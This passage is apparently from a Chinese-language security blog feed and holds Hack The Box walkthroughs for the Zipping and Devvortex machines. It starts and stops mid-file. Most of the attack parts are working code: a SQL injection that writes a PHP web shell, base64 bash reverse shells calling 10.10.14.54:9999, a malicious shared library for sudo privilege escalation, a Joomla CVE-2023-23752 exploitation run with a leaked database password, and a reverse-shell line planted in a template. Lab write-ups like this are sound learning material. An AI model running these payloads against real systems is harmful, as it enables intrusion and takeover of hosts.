class=&quot;price&quot;&gt;&amp;dollar;&lt;?=$product[&#x27;price&#x27;]?&gt;&lt;/td&gt;</span><br><span class=\"line\">                    &lt;td class=&quot;quantity&quot;&gt;</span><br><span class=\"line\">                        &lt;input type=&quot;number&quot; name=&quot;quantity-&lt;?=$product[&#x27;id&#x27;]?&gt;&quot; value=&quot;&lt;?=$products_in_cart[$product[&#x27;id&#x27;]]?&gt;&quot; min=&quot;1&quot; max=&quot;&lt;?=$product[&#x27;quantity&#x27;]?&gt;&quot; placeholder=&quot;Quantity&quot; required&gt;</span><br><span class=\"line\">                    &lt;/td&gt;</span><br><span class=\"line\">                    &lt;td class=&quot;price&quot;&gt;&amp;dollar;&lt;?=$product[&#x27;price&#x27;] * $products_in_cart[$product[&#x27;id&#x27;]]?&gt;&lt;/td&gt;</span><br><span class=\"line\">                &lt;/tr&gt;</span><br><span class=\"line\">                &lt;?php endforeach; ?&gt;</span><br><span class=\"line\">                &lt;?php endif; ?&gt;</span><br><span class=\"line\">            &lt;/tbody&gt;</span><br><span class=\"line\">        &lt;/table&gt;</span><br><span class=\"line\">        &lt;div class=&quot;subtotal&quot;&gt;</span><br><span class=\"line\">            &lt;span class=&quot;text&quot;&gt;Subtotal&lt;/span&gt;</span><br><span class=\"line\">            &lt;span class=&quot;price&quot;&gt;&amp;dollar;&lt;?=$subtotal?&gt;&lt;/span&gt;</span><br><span class=\"line\">        &lt;/div&gt;</span><br><span class=\"line\">        &lt;div class=&quot;buttons&quot;&gt;</span><br><span class=\"line\">            &lt;input type=&quot;submit&quot; value=&quot;Update&quot; name=&quot;update&quot;&gt;</span><br><span class=\"line\">            &lt;input type=&quot;submit&quot; value=&quot;Place Order&quot; name=&quot;placeorder&quot;&gt;</span><br><span class=\"line\">\t    &lt;input type=&quot;submit&quot; value=&quot;Clear&quot; name=&quot;clear&quot; onsubmit=&quot;&quot;&gt;</span><br><span class=\"line\">        &lt;/div&gt;</span><br><span class=\"line\">    &lt;/form&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?=template_footer()?&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<h4 id=\"代码审计\"><a class=\"anchor\" href=\"#代码审计\">#</a> 代码审计</h4>\n<p>通过观察代码可以得知</p>\n<p>product.php 代码中执行 sql 语句时使用了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$stmt = $pdo-&gt;prepare(&quot;SELECT * FROM products WHERE id = &#x27;$id&#x27;&quot;);</span><br></pre></td></tr></table></figure></p>\n<p>将代码预编译了 sql 语句</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SQL预编译是指在执行SQL语句之前，将参数送到数据库预编译，编译完成后，将验证后的SQL语句发送到数据库进行执行。 这种方法可以有效地防止SQL注入攻击，因为攻击者不能通过注入代码来修改或者干扰SQL预编译中的语句。</span><br></pre></td></tr></table></figure></p>\n<p>而 cart.php 中是直接写入的 sql 语法</p>\n<p>所以能导致 sql 注入</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$sql = &quot;SELECT * FROM products WHERE id = &#x27;&quot; . $_POST[&#x27;product_id&#x27;] . &quot;&#x27;&quot;;</span><br><span class=\"line\">$product = $pdo-&gt;query($sql)-&gt;fetch(PDO::FETCH_ASSOC);</span><br></pre></td></tr></table></figure></p>\n<p>但是它的前面使用了不少过滤</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\\-_=+&#123;&#125;\\[\\]\\\\|;:&#x27;\\&quot;,.&lt;&gt;\\/?]|[^0-9]$/&quot;, $product_id, $match) || preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\\-_=+&#123;&#125;[\\]\\\\|;:&#x27;\\&quot;,.&lt;&gt;\\/?]/i&quot;, $quantity, $match)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">^.*[A-Za-z!#$%^&amp;*()\\-_=+&#123;&#125;\\[\\]\\\\|;:&#x27;\\&quot;,.&lt;&gt;\\/?]|[^0-9]$</span><br><span class=\"line\">这个正则的话前面的^.*可以使用%0a绕过</span><br><span class=\"line\">然后后面的$只是匹配个数字而已后面直接加上</span><br></pre></td></tr></table></figure></p>\n<p>先构造好思路，首先利用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shop/index.php?page=</span><br></pre></td></tr></table></figure></p>\n<p>能达到文件任意读取，</p>\n<p>在通过 shop/cart.php 来进行上传马儿</p>\n<h4 id=\"反弹shell\"><a class=\"anchor\" href=\"#反弹shell\">#</a> 反弹 shell</h4>\n<p>经过测试发现都不能写入木马，最后看别人 wp 用 into outfile 写到 /var/lib/mysql 里面去就行了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /shop/index.php?page=cart HTTP/1.1</span><br><span class=\"line\"> </span><br><span class=\"line\">Host: 10.10.11.229</span><br><span class=\"line\"> </span><br><span class=\"line\">Content-Length: 113</span><br><span class=\"line\"> </span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\"> </span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\"> </span><br><span class=\"line\">Origin: http://10.10.11.229</span><br><span class=\"line\"> </span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\"> </span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36</span><br><span class=\"line\"> </span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class=\"line\"> </span><br><span class=\"line\">Referer: http://10.10.11.229/shop/index.php?page=cart</span><br><span class=\"line\"> </span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\"> </span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\"> </span><br><span class=\"line\">Cookie: PHPSESSID=2r2p0aicavvo4ka7ncc5ce1i0a</span><br><span class=\"line\"> </span><br><span class=\"line\">Connection: close</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">quantity=1&amp;product_id=%0a&#x27;%3bselect+&#x27;&lt;%3fphp+system(&quot;$_POST[1]&quot;)%3b%3f&gt;&#x27;+into+outfile+&#x27;/var/lib/mysql/7.php&#x27;;+--2</span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /shop/index.php?page=/var/lib/mysql/7 HTTP/1.1</span><br><span class=\"line\">Host: 10.10.11.229</span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Cookie: PHPSESSID=hngopd6tchq7vfp0pfndmd7oq3</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Length: 4</span><br><span class=\"line\"></span><br><span class=\"line\">1=ls</span><br></pre></td></tr></table></figure></p>\n<p>命令执行成功</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 200 OK</span><br><span class=\"line\">Date: Fri, 15 Dec 2023 06:40:57 GMT</span><br><span class=\"line\">Server: Apache/2.4.54 (Ubuntu)</span><br><span class=\"line\">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class=\"line\">Cache-Control: no-store, no-cache, must-revalidate</span><br><span class=\"line\">Pragma: no-cache</span><br><span class=\"line\">Vary: Accept-Encoding</span><br><span class=\"line\">Content-Length: 89</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Type: text/html; charset=UTF-8</span><br><span class=\"line\"></span><br><span class=\"line\">assets</span><br><span class=\"line\">cart.php</span><br><span class=\"line\">functions.php</span><br><span class=\"line\">home.php</span><br><span class=\"line\">index.php</span><br><span class=\"line\">placeorder.php</span><br><span class=\"line\">product.php</span><br><span class=\"line\">products.php</span><br></pre></td></tr></table></figure></p>\n<p>接下来反弹一下 shell</p>\n<p>使用加密后的 bash 反弹一下试试</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">└─$ echo bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.54/9999 0&gt;&amp;1&quot;|base64</span><br><span class=\"line\">YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjU0Lzk5OTkgMD4mMQo=</span><br></pre></td></tr></table></figure></p>\n<p>使用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /shop/index.php?page=/var/lib/mysql/7 HTTP/1.1</span><br><span class=\"line\">Host: 10.10.11.229</span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Cookie: PHPSESSID=hngopd6tchq7vfp0pfndmd7oq3</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Length: 90</span><br><span class=\"line\"></span><br><span class=\"line\">1=echo YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjU0Lzk5OTkgMD4mMQo=|base64 -d|bash</span><br></pre></td></tr></table></figure></p>\n<p>得到 shell</p>\n<p>虽然是 1001 但是目录下有 user.txt</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uid=1001(rektsu) gid=1001(rektsu) groups=1001(rektsu)</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"提权\"><a class=\"anchor\" href=\"#提权\">#</a> 提权</h4>\n<p>执行 sudo -l</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo -l</span><br><span class=\"line\">Matching Defaults entries for rektsu on zipping:</span><br><span class=\"line\">    env_reset, mail_badpass,</span><br><span class=\"line\">    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin</span><br><span class=\"line\"></span><br><span class=\"line\">User rektsu may run the following commands on zipping:</span><br><span class=\"line\">    (ALL) NOPASSWD: /usr/bin/stock</span><br></pre></td></tr></table></figure></p>\n<p>使用 ltrace -Ss 10000 ./stock</p>\n<p>这个 stock 的调用库竟然使用了 rektsu/.config/libcounter.so 意义很明显了，</p>\n<p>我们直接在.config 下面写一个一样名称的动态链接库</p>\n<p>只要这个动态链接库执行一下 /usr/bin/bash -i 就相当于提权脚本一样</p>\n<p>先写一个 c</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;stdlib.h&gt;</span><br><span class=\"line\"> </span><br><span class=\"line\">void __attribute__((constructor)) init() &#123;</span><br><span class=\"line\">    system(&quot;/usr/bin/bash -i&quot;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>在使用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -c –fPIC –shared –o /home/rektsu/.config/libcounter.so *.c</span><br></pre></td></tr></table></figure></p>\n<p>即可提权成功</p>\n",
            "tags": [
                "渗透"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-Devvortex/",
            "url": "https://lookhui.github.io/HTB-Devvortex/",
            "title": "HTB-Devvortex",
            "date_published": "2023-12-14T08:15:11.000Z",
            "content_html": "<h1 id=\"devvortex\"><a class=\"anchor\" href=\"#devvortex\">#</a> Devvortex</h1>\n<p>本题知识简介</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Joomla未授权访问漏洞(CVE-2023-23752):</span><br><span class=\"line\">适用版本</span><br><span class=\"line\">4.0.0 &lt;= Joomla &lt;= 4.2.7</span><br><span class=\"line\">构造路由</span><br><span class=\"line\">/api/index.php/v1/config/application?public=true</span><br><span class=\"line\"></span><br><span class=\"line\">apport-cli提权</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h4>\n<p>使用 nmap 进行扫描同时使用浏览器进行访问</p>\n<p>修改 hosts</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">10.10.11.242 devvortex.htb</span><br></pre></td></tr></table></figure></p>\n<p>然后去扫目录没有什么可用信息</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">********************************************************</span><br><span class=\"line\">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class=\"line\">********************************************************</span><br><span class=\"line\"></span><br><span class=\"line\">Target: http://devvortex.htb/FUZZ</span><br><span class=\"line\">Total requests: 45524</span><br><span class=\"line\"></span><br><span class=\"line\">=====================================================================</span><br><span class=\"line\">ID           Response   Lines    Word       Chars       Payload</span><br><span class=\"line\">=====================================================================</span><br><span class=\"line\"></span><br><span class=\"line\">000000001:   301        7 L      12 W       178 Ch      &quot;images&quot;</span><br><span class=\"line\">000000002:   301        7 L      12 W       178 Ch      &quot;css&quot;</span><br><span class=\"line\">000000004:   301        7 L      12 W       178 Ch      &quot;js&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">Total time: 262.5244</span><br><span class=\"line\">Processed Requests: 5190</span><br><span class=\"line\">Filtered Requests: 5187</span><br><span class=\"line\">Requests/sec.: 19.76958</span><br></pre></td></tr></table></figure></p>\n<p>在去扫描子域名获得子域名</p>\n<p>通过 wfuzz 去扫描子域名</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wfuzz -w 指定字典 -u &quot;http://devvortex.htb&quot; -H &quot;Host:FUZZ.devvortex.htb&quot; --hl 7</span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">000000499:   200        501 L    1581 W     23221 Ch    &quot;dev&quot;</span><br></pre></td></tr></table></figure></p>\n<p>加入 hosts 然后去访问</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">10.10.11.242 dev.devvortex.htb</span><br></pre></td></tr></table></figure></p>\n<p>nmap 扫描结果如下</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-14 16:28 中国标准时间</span><br><span class=\"line\">Nmap scan report for devvortex.htb (10.10.11.242)</span><br><span class=\"line\">Host is up (0.35s latency).</span><br><span class=\"line\">Not shown: 998 closed tcp ports (reset)</span><br><span class=\"line\">PORT   STATE SERVICE</span><br><span class=\"line\">22/tcp open  ssh</span><br><span class=\"line\">80/tcp open  http</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 81.91 seconds</span><br></pre></td></tr></table></figure></p>\n<p>扫描子域名目录</p>\n<p>扫出来了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">000000001:   301        7 L      12 W       178 Ch      &quot;images&quot;</span><br><span class=\"line\">000000040:   301        7 L      12 W       178 Ch      &quot;modules&quot;</span><br><span class=\"line\">000000033:   301        7 L      12 W       178 Ch      &quot;includes&quot;</span><br><span class=\"line\">000000037:   301        7 L      12 W       178 Ch      &quot;language&quot;</span><br><span class=\"line\">000000026:   301        7 L      12 W       178 Ch      &quot;plugins&quot;</span><br><span class=\"line\">000000013:   301        7 L      12 W       178 Ch      &quot;templates&quot;</span><br><span class=\"line\">000000091:   301        7 L      12 W       178 Ch      &quot;media&quot;</span><br><span class=\"line\">000000006:   200        501 L    1581 W     23221 Ch    &quot;index.php&quot;</span><br><span class=\"line\">000000058:   301        7 L      12 W       178 Ch      &quot;cache&quot;</span><br><span class=\"line\">000000138:   301        7 L      12 W       178 Ch      &quot;tmp&quot;</span><br><span class=\"line\">000000132:   200        29 L     105 W      764 Ch      &quot;robots.txt&quot;</span><br><span class=\"line\">000000151:   301        7 L      12 W       178 Ch      &quot;administrator&quot;</span><br><span class=\"line\">000000201:   200        74 L     540 W      4940 Ch     &quot;README.txt&quot;</span><br><span class=\"line\">000000198:   301        7 L      12 W       178 Ch      &quot;libraries&quot;</span><br><span class=\"line\">000000209:   403        7 L      10 W       162 Ch      &quot;.DS_Store&quot;</span><br><span class=\"line\">000000243:   200        0 L      0 W        0 Ch        &quot;configuration.php&quot;</span><br><span class=\"line\">000000217:   301        7 L      12 W       178 Ch      &quot;components&quot;</span><br><span class=\"line\">000000339:   200        172 L    1008 W     6858 Ch     &quot;htaccess.txt&quot;</span><br><span class=\"line\">000000588:   200        501 L    1581 W     23221 Ch    &quot;home&quot;</span><br><span class=\"line\">000000925:   403        7 L      10 W       162 Ch      &quot;.htpasswd&quot;</span><br><span class=\"line\">000001005:   200        339 L    2968 W     18092 Ch    &quot;LICENSE.txt&quot;</span><br><span class=\"line\">000001109:   301        7 L      12 W       178 Ch      &quot;cli&quot;</span><br><span class=\"line\">000001149:   403        7 L      10 W       162 Ch      &quot;.thumbs&quot;</span><br></pre></td></tr></table></figure></p>\n<p>访问 readme.txt 能够指定服务信息</p>\n<p>访问 robots.txt 得到几个路由</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User-agent: *</span><br><span class=\"line\">Disallow: /administrator/</span><br><span class=\"line\">Disallow: /api/</span><br><span class=\"line\">Disallow: /bin/</span><br><span class=\"line\">Disallow: /cache/</span><br><span class=\"line\">Disallow: /cli/</span><br><span class=\"line\">Disallow: /components/</span><br><span class=\"line\">Disallow: /includes/</span><br><span class=\"line\">Disallow: /installation/</span><br><span class=\"line\">Disallow: /language/</span><br><span class=\"line\">Disallow: /layouts/</span><br><span class=\"line\">Disallow: /libraries/</span><br><span class=\"line\">Disallow: /logs/</span><br><span class=\"line\">Disallow: /modules/</span><br><span class=\"line\">Disallow: /plugins/</span><br><span class=\"line\">Disallow: /tmp/</span><br></pre></td></tr></table></figure></p>\n<p>访问 /administrator/ 是个登录框需要密码</p>\n<p>那么我们在网上找这个漏洞</p>\n<h4 id=\"反弹shell\"><a class=\"anchor\" href=\"#反弹shell\">#</a> 反弹 shell</h4>\n<p>并且使用 msfconsole 来打</p>\n<p>use scanner/http/joomla_api_improper_access_checks</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> ID   Super User  Name        Username  Email                Send Email  Register Date    Last Visit Date  Group Names</span><br><span class=\"line\"> --   ----------  ----        --------  -----                ----------  -------------    ---------------  -----------</span><br><span class=\"line\"> 649  *           lewis       lewis     lewis@devvortex.htb  1           2023-09-25 16:4  2023-12-14 08:5  Super Users</span><br><span class=\"line\">                                                                         4:24             8:39</span><br><span class=\"line\"> 650              logan paul  logan     logan@devvortex.htb  0           2023-09-26 19:1                   Registered</span><br><span class=\"line\">                                                                         5:42</span><br><span class=\"line\"></span><br><span class=\"line\">[+] Config JSON saved to /home/iliy/.msf4/loot/20231214171300_default_10.10.11.242_joomla.config_395747.bin</span><br><span class=\"line\">[+] Joomla Config</span><br><span class=\"line\">=============</span><br><span class=\"line\"></span><br><span class=\"line\"> Setting        Value</span><br><span class=\"line\"> -------        -----</span><br><span class=\"line\"> db encryption  0</span><br><span class=\"line\"> db host        localhost</span><br><span class=\"line\"> db name        joomla</span><br><span class=\"line\"> db password    P4ntherg0t1n5r3c0n##</span><br><span class=\"line\"> db prefix      sd4fg_</span><br><span class=\"line\"> db user        lewis</span><br><span class=\"line\"> dbtype         mysqli</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class=\"line\">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure></p>\n<p>得到数据库账号和密码</p>\n<p>然后登录点击 system 然后在 templates 的第一个里面修改代码，index.php 只有读取权限写入不了那我们写 error.php 一样的</p>\n<p>写入</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">system(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.54/9999 0&gt;&amp;1&quot;&#x27;);</span><br></pre></td></tr></table></figure></p>\n<p>然后</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvnp 9999</span><br></pre></td></tr></table></figure></p>\n<p>在根据这个路径进行访问即可得到 shell</p>\n<p>查看一下用户</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span 